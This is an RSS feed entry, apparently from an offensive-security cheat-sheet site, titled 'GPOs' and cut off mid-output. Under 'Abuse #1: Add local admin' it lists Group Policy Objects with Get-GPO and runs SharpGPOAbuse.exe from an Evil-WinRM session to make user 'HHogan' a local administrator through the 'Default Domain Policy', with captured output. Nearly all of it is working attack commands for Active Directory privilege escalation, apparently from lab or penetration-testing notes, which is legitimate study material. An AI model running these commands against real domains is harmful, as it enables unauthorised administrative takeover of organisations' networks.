channel.title: GPOs on TLDRBins
channel.description: Recent content in GPOs on TLDRBins

item.title: GPOs
item.description: Abuse #1: Add local admin 1. List GPOs Name Get-GPO -All | Select-Object DisplayName *Evil-WinRM* PS C:\Users\HHogan\Documents> Get-GPO -All | Select-Object DisplayName DisplayName ----------- Windows Firewall GPO Default Domain Policy Default Active Directory Settings GPO Default Domain Controllers Policy Windows Update GPO Windows Update Domain Policy Software Installation GPO Password Policy GPO 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount '<USER>' --GPOName '<GPO_NAME>' *Evil-WinRM* PS C:\Users\HHogan\Documents> .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount 'HHogan' --GPOName 'Default Domain Policy' [+] Domain = office.
